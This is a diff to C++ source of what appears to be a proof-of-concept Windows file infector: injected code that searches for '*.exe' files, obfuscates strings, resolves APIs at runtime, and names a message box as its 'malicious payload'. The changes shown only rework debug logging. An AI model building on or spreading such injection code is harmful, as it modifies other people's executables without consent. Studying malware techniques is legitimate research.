@@ -4,8 +4,6 @@
 #include "libproc.hpp"
 #include "utils.h"
 
-#define __PRINTF_BUFSIZE 1024
-
 EXTERN_C_START
 extern CONST BYTE __payload_start;
 extern CONST VOID payload();
@@ -35,8 +33,9 @@ INJECTED_CODE VOID inj_code_c() {
     DECLARE_OBFUSCATED(exeExt, "*.exe");            // File extension to search for
 #ifdef PL_DEBUG
     // Declarations for debug strings
-    CONST CHAR sNewline[] = "\n";
+    CONST CHAR sNewline[1] = {'\n'};
 
+    INJECTED_VAR static CONST CHAR mbDbgTitle[] = "Debug";
     INJECTED_VAR static CONST CHAR msgSeparator[] = "====================";
     INJECTED_VAR static CONST CHAR msgModuleName[] = "Current module name: ";
     INJECTED_VAR static CONST CHAR msgInjecting[] = "Injecting: ";
@@ -71,14 +70,32 @@ INJECTED_CODE VOID inj_code_c() {
     CONST auto pMessageBoxA = GET_FUNC(pUser32Dll, MessageBoxA);
 
 #ifdef PL_DEBUG
+    BOOL bUseMsgbox = FALSE;  // Whether to use MessageBoxA for debug, if no console is available
     CONST auto pGetStdHandle = GET_FUNC(pKernel32Dll, GetStdHandle);
     CONST auto pWriteConsoleA = GET_FUNC(pKernel32Dll, WriteConsoleA);
     HANDLE hStderr = pGetStdHandle(STD_ERROR_HANDLE);
     if (!hStderr || hStderr == INVALID_HANDLE_VALUE) {
-        return;
+        bUseMsgbox = TRUE;
     }
-#define PRINT_DBG(text) pWriteConsoleA(hStderr, text, (DWORD)my_strlen(text), NULL, NULL)
-#define PRINT_DBG_NL()  pWriteConsoleA(hStderr, sNewline, 1, NULL, NULL)
+
+#define PRINT_DBG_OR_MB(text, allowMb)                                         \
+    do {                                                                       \
+        if (allowMb && bUseMsgbox) {                                           \
+            pMessageBoxA(NULL, text, mbDbgTitle, MB_OK | MB_ICONINFORMATION);  \
+        } else {                                                               \
+            pWriteConsoleA(hStderr, text, (DWORD)my_strlen(text), NULL, NULL); \
+        }                                                                      \
+    } while (0)
+
+#define PRINT_DBG(text)       PRINT_DBG_OR_MB(text, TRUE)
+#define PRINT_DBG_NO_MB(text) PRINT_DBG_OR_MB(text, FALSE)
+
+#define PRINT_DBG_NL()                                        \
+    do {                                                      \
+        if (!bUseMsgbox) {                                    \
+            pWriteConsoleA(hStderr, sNewline, 1, NULL, NULL); \
+        }                                                     \
+    } while (0)
 #else                   // PL_DEBUG
 #define PRINT_DBG(text) /* [Debug disabled] */
 #define PRINT_DBG_NL()  /* [Debug disabled] */
@@ -304,7 +321,7 @@ INJECTED_CODE VOID inj_code_c() {
 
 end:
     PRINT_DBG_NL();
-    PRINT_DBG(msgSeparator);
+    PRINT_DBG_NO_MB(msgSeparator);
     PRINT_DBG_NL();
 
     // Actual malicious payload: display a message box
